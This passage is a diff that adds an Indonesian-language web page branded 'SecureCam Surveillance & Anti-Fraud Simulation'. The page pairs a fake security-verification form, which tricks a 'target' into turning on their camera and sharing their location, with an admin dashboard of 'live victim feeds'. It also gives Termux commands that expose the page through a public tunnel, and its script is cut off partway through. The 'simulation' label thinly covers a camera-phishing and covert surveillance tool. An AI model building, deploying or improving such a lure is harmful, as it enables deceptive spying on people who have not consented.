@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="id" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureCam Surveillance & Anti-Fraud Simulation</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter & JetBrains Mono -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        cyber: {
+                            dark: '#050b14',
+                            card: '#0a1527',
+                            border: '#1e3a5f',
+                            neon: '#00f2fe',
+                            pink: '#fe007a',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="h-full bg-slate-950 text-slate-100 font-sans antialiased overflow-x-hidden flex flex-col selection:bg-cyan-500 selection:text-black">
+
+    <header class="bg-slate-900/90 backdrop-blur-md border-b border-cyan-500/20 sticky top-0 z-50 px-4 lg:px-8 py-3 flex items-center justify-between">
+        <div class="flex items-center space-x-3">
+            <div class="h-10 w-10 rounded-xl bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg shadow-cyan-500/30 border border-cyan-400/30">
+                <i class="fa-solid fa-skull text-slate-950 text-lg font-bold"></i>
+            </div>
+            <div>
+                <h1 class="font-bold text-base sm:text-lg tracking-wide bg-gradient-to-r from-cyan-400 via-sky-300 to-blue-500 bg-clip-text text-transparent font-mono">AHZ-SURVEILLANCE v2.4</h1>
+                <p class="text-xs text-slate-400">Anti-Fraud Simulation & Termux Link Bridge</p>
+            </div>
+        </div>
+
+        <div class="flex items-center space-x-2 sm:space-x-4">
+            <!-- Mode Switcher Buttons -->
+            <div class="bg-slate-900/90 p-1 rounded-xl flex border border-cyan-500/30 shadow-inner">
+                <button onclick="switchView('target')" id="btn-target" class="px-3 sm:px-4 py-1.5 rounded-lg text-xs sm:text-sm font-medium transition-all duration-200 bg-cyan-600 text-white shadow-md flex items-center space-x-2">
+                    <i class="fa-solid fa-bullseye"></i>
+                    <span class="hidden sm:inline">Target Link Page</span>
+                </button>
+                <button onclick="switchView('admin')" id="btn-admin" class="px-3 sm:px-4 py-1.5 rounded-lg text-xs sm:text-sm font-medium transition-all duration-200 text-slate-400 hover:text-white flex items-center space-x-2">
+                    <i class="fa-solid fa-terminal"></i>
+                    <span class="hidden sm:inline">Admin Dashboard & Termux</span>
+                    <span id="badge-admin-count" class="bg-red-500 text-white text-[10px] px-1.5 py-0.2 rounded-full hidden">0</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-1 flex flex-col p-4 sm:p-6 lg:p-8 max-w-7xl mx-auto w-full">
+
+        <!-- ================= PAGE 1: TARGET LINK VIEW ================= -->
+        <div id="view-target" class="flex-1 flex flex-col items-center justify-center">
+            <div class="w-full max-w-md bg-slate-900/95 border border-cyan-500/30 rounded-2xl shadow-2xl shadow-cyan-500/10 p-6 sm:p-8 backdrop-blur-xl relative overflow-hidden">
+                <div class="absolute -top-12 -right-12 w-32 h-32 bg-cyan-500/20 rounded-full blur-2xl pointer-events-none"></div>
+                
+                <div class="text-center mb-6">
+                    <div class="inline-flex p-3 rounded-2xl bg-cyan-500/10 text-cyan-400 mb-3 border border-cyan-500/30 shadow-inner">
+                        <i class="fa-solid fa-shield-halved text-2xl"></i>
+                    </div>
+                    <h2 class="text-xl sm:text-2xl font-bold text-white font-mono">Verifikasi Keamanan Target</h2>
+                    <p class="text-xs sm:text-sm text-slate-400 mt-1">Masukkan kode otorisasi <span class="font-mono text-cyan-400">ahzagenteng</span> untuk membuka akses verifikasi kamera anti-penipuan.</p>
+                </div>
+
+                <!-- Step 1A: Code entry form -->
+                <div id="target-step-code" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2 font-mono">Kode Akses Rahasia</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                <i class="fa-solid fa-key"></i>
+                            </span>
+                            <input type="password" id="access-code-input" placeholder="Masukkan kode (ahzagenteng)" 
+                                class="w-full pl-10 pr-4 py-3 bg-slate-950 border border-slate-700/80 rounded-xl text-sm text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 transition-all font-mono">
+                        </div>
+                        <p id="code-error" class="text-xs text-red-400 mt-1.5 hidden"><i class="fa-solid fa-circle-exclamation mr-1"></i> Kode salah! Gunakan kode resmi: <span class="font-mono font-bold">ahzagenteng</span></p>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2 font-mono">Nama Perangkat / Target</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                <i class="fa-solid fa-user-secret"></i>
+                            </span>
+                            <input type="text" id="target-name-input" placeholder="Nama target..." value="Target_Android_01"
+                                class="w-full pl-10 pr-4 py-3 bg-slate-950 border border-slate-700/80 rounded-xl text-sm text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 transition-all font-mono">
+                        </div>
+                    </div>
+
+                    <button onclick="handleTargetConnect()" class="w-full mt-2 py-3 px-4 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-medium rounded-xl shadow-lg shadow-cyan-600/30 transition-all duration-200 flex items-center justify-center space-x-2 font-mono text-sm border border-cyan-400/30">
+                        <span>VERIFIKASI & AKSES KAMERA</span>
+                        <i class="fa-solid fa-terminal"></i>
+                    </button>
+
+                    <!-- Quick copy target link box -->
+                    <div class="mt-4 p-3 bg-slate-950/80 border border-slate-800 rounded-xl">
+                        <div class="flex items-center justify-between mb-1.5">
+                            <span class="text-[11px] font-mono text-slate-400"><i class="fa-solid fa-link text-cyan-400 mr-1"></i> Bagikan Link ke Target:</span>
+                            <button onclick="copyTargetLink()" class="text-[10px] text-cyan-400 hover:underline font-mono flex items-center space-x-1">
+                                <i class="fa-regular fa-copy"></i>
+                                <span id="copy-text-btn">Salin Link</span>
+                            </button>
+                        </div>
+                        <input type="text" id="shareable-link-input" readonly class="w-full bg-slate-900 border border-slate-800 rounded px-2 py-1.5 text-[11px] font-mono text-slate-300 select-all" value="">
+                    </div>
+                </div>
+
+                <!-- Step 1B: Active Stream / Success View for Target -->
+                <div id="target-step-stream" class="space-y-4 hidden">
+                    <div class="relative rounded-xl overflow-hidden bg-slate-950 border border-cyan-500/30 aspect-[4/3] flex items-center justify-center shadow-inner">
+                        <video id="target-video" autoplay playsinline muted class="w-full h-full object-cover transform -scale-x-100"></video>
+                        <canvas id="target-canvas" class="hidden"></canvas>
+                        
+                        <!-- Simulated Live Badge -->
+                        <div class="absolute top-3 left-3 bg-slate-900/90 backdrop-blur-md px-3 py-1 rounded-full border border-cyan-500/40 flex items-center space-x-2">
+                            <span class="h-2.5 w-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                            <span class="text-xs font-medium text-emerald-400 font-mono">STREAMING KE ADMIN</span>
+                        </div>
+                    </div>
+
+                    <div class="bg-emerald-950/30 border border-emerald-500/30 rounded-xl p-3 flex items-center space-x-3">
+                        <div class="p-2 rounded-lg bg-emerald-500/20 text-emerald-400">
+                            <i class="fa-solid fa-check-circle text-lg"></i>
+                        </div>
+                        <div>
+                            <h4 class="text-xs font-semibold text-emerald-300 font-mono">Data Berhasil Dikirim</h4>
+                            <p class="text-[11px] text-emerald-400/80">Kamera & lokasi target terpantau secara real-time di Dashboard Admin.</p>
+                        </div>
+                    </div>
+
+                    <button onclick="handleTargetDisconnect()" class="w-full py-2.5 px-4 bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 font-medium rounded-xl transition-all text-sm flex items-center justify-center space-x-2 font-mono">
+                        <i class="fa-solid fa-power-off"></i>
+                        <span>Putuskan Sesi</span>
+                    </button>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- ================= PAGE 2: ADMIN DASHBOARD & TERMUX VIEW ================= -->
+        <div id="view-admin" class="flex-1 flex flex-col space-y-6 hidden">
+            
+            <!-- Admin Top Stats -->
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                <div class="bg-slate-900/90 border border-cyan-500/20 rounded-2xl p-4 flex items-center justify-between backdrop-blur-xl">
+                    <div>
+                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider font-mono">Target Online</p>
+                        <h3 id="stat-active-clients" class="text-2xl font-bold text-white mt-1 font-mono">0</h3>
+                    </div>
+                    <div class="p-3 rounded-xl bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
+                        <i class="fa-solid fa-users text-xl"></i>
+                    </div>
+                </div>
+                <div class="bg-slate-900/90 border border-emerald-500/20 rounded-2xl p-4 flex items-center justify-between backdrop-blur-xl">
+                    <div>
+                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider font-mono">Status Server / Termux</p>
+                        <h3 class="text-2xl font-bold text-emerald-400 mt-1 flex items-center font-mono text-sm sm:text-base">
+                            <span class="h-3 w-3 rounded-full bg-emerald-500 inline-block mr-2 animate-pulse"></span>
+                            <span>Port 8080 Active</span>
+                        </h3>
+                    </div>
+                    <div class="p-3 rounded-xl bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                        <i class="fa-solid fa-server text-xl"></i>
+                    </div>
+                </div>
+                <div class="bg-slate-900/90 border border-purple-500/20 rounded-2xl p-4 flex items-center justify-between backdrop-blur-xl">
+                    <div>
+                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider font-mono">Total Kunjungan Link</p>
+                        <h3 id="stat-total-conn" class="text-2xl font-bold text-white mt-1 font-mono">0</h3>
+                    </div>
+                    <div class="p-3 rounded-xl bg-purple-500/10 text-purple-400 border border-purple-500/20">
+                        <i class="fa-solid fa-chart-line text-xl"></i>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Admin Grid -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-1">
+                
+                <!-- Left 2 Cols: Live Victim Feeds -->
+                <div class="lg:col-span-2 flex flex-col space-y-4">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-video text-cyan-400"></i>
+                            <h3 class="font-semibold text-white text-base font-mono">Live Feed & Data Target Terhubung</h3>
+                        </div>
+                        <button onclick="clearAllTargets()" class="text-xs text-slate-400 hover:text-red-400 transition-colors flex items-center space-x-1 font-mono">
+                            <i class="fa-solid fa-trash-can"></i>
+                            <span>Reset Data</span>
+                        </button>
+                    </div>
+
+                    <!-- Feeds Grid -->
+                    <div id="admin-feeds-grid" class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <!-- Empty State -->
+                        <div id="admin-empty-state" class="col-span-full py-16 bg-slate-900/40 border border-dashed border-slate-800 rounded-2xl flex flex-col items-center justify-center text-center">
+                            <div class="p-4 rounded-full bg-slate-900 text-slate-600 mb-3 border border-slate-800">
+                                <i class="fa-solid fa-satellite-dish text-3xl"></i>
+                            </div>
+                            <h4 class="text-sm font-semibold text-slate-300 font-mono">Belum Ada Target Yang Memasukkan Kode</h4>
+                            <p class="text-xs text-slate-500 max-w-sm mt-1">Bagikan link Target ke korban, lalu minta ketik kode <span class="font-mono text-cyan-400">ahzagenteng</span>.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Col: Termux Instructions & Commands -->
+                <div class="bg-slate-900/90 border border-cyan-500/20 rounded-2xl p-4 flex flex-col backdrop-blur-xl space-y-4">
+                    <div class="flex items-center justify-between pb-3 border-b border-slate-800">
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-terminal text-cyan-400"></i>
+                            <h3 class="font-semibold text-white text-sm font-mono">Termux Deployment Guide</h3>
+                        </div>
+                        <span class="text-[10px] font-mono bg-cyan-500/10 text-cyan-400 px-2 py-0.5 rounded border border-cyan-500/30">PYTHON / NODE</span>
+                    </div>
+
+                    <div class="space-y-3 text-xs text-slate-300">
+                        <p class="text-slate-400 leading-relaxed">
+                            Ingin menjalankan simulasi ini secara mandiri di HP Android menggunakan aplikasi <strong class="text-cyan-400">Termux</strong>? Salin perintah di bawah ini:
+                        </p>
+
+                        <!-- Step 1 Termux -->
+                        <div class="bg-slate-950 p-3 rounded-xl border border-slate-800 space-y-1.5 font-mono">
+                            <div class="text-[10px] text-cyan-400 font-bold"># 1. Update & Install Python/Node</div>
+                            <div class="bg-slate-900 p-2 rounded text-[11px] text-slate-200 flex items-center justify-between">
+                                <code>pkg update && pkg install python nodejs -y</code>
+                                <button onclick="copyCodeSnippet(this, 'pkg update && pkg install python nodejs -y')" class="text-slate-400 hover:text-cyan-400 ml-2"><i class="fa-regular fa-copy"></i></button>
+                            </div>
+                        </div>
+
+                        <!-- Step 2 Termux -->
+                        <div class="bg-slate-950 p-3 rounded-xl border border-slate-800 space-y-1.5 font-mono">
+                            <div class="text-[10px] text-cyan-400 font-bold"># 2. Jalankan HTTP Server Lokal</div>
+                            <div class="bg-slate-900 p-2 rounded text-[11px] text-slate-200 flex items-center justify-between">
+                                <code>python3 -m http.server 8080</code>
+                                <button onclick="copyCodeSnippet(this, 'python3 -m http.server 8080')" class="text-slate-400 hover:text-cyan-400 ml-2"><i class="fa-regular fa-copy"></i></button>
+                            </div>
+                        </div>
+
+                        <!-- Step 3 Termux -->
+                        <div class="bg-slate-950 p-3 rounded-xl border border-slate-800 space-y-1.5 font-mono">
+                            <div class="text-[10px] text-cyan-400 font-bold"># 3. Buat Tunneling Publik (LocalTunnel / Ngrok)</div>
+                            <div class="bg-slate-900 p-2 rounded text-[11px] text-slate-200 flex items-center justify-between">
+                                <code>npx localtunnel --port 8080</code>
+                                <button onclick="copyCodeSnippet(this, 'npx localtunnel --port 8080')" class="text-slate-400 hover:text-cyan-400 ml-2"><i class="fa-regular fa-copy"></i></button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Logs Section -->
+                    <div class="flex-1 flex flex-col pt-2 border-t border-slate-800 mt-2">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="text-[11px] font-mono text-slate-400"><i class="fa-solid fa-list text-cyan-400 mr-1"></i> Log Aktivitas Target:</span>
+                        </div>
+                        <div id="admin-logs-container" class="flex-1 bg-slate-950 p-2 rounded-xl border border-slate-800 overflow-y-auto space-y-1.5 font-mono text-[10px] text-slate-300 max-h-40">
+                            <!-- Logs injected here -->
+                            <div class="text-slate-500">[00:00:00] Menunggu koneksi kode 'ahzagenteng'...</div>
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+        </div>
+
+    </main>
+
+    <script>
+        let currentView = 'target';
+        let isConnected = false;
+        let mediaStream = null;
+        let broadcastInterval = null;
+        let totalConnectionsCount = 0;
+        
+        let activeClients = JSON.parse(localStorage.getItem('ahz_clients') || '{}');
+        let activityLogs = JSON.parse(localStorage.getItem('ahz_logs') || '[]');
+
+        window.onload = function() {
+            // Set shareable link based on current location
+            const currentUrl = window.location.href.split('#')[0];
+            document.getElementById('shareable-link-input').value = currentUrl;
+
+            renderAdminDashboard();
+            updateLo
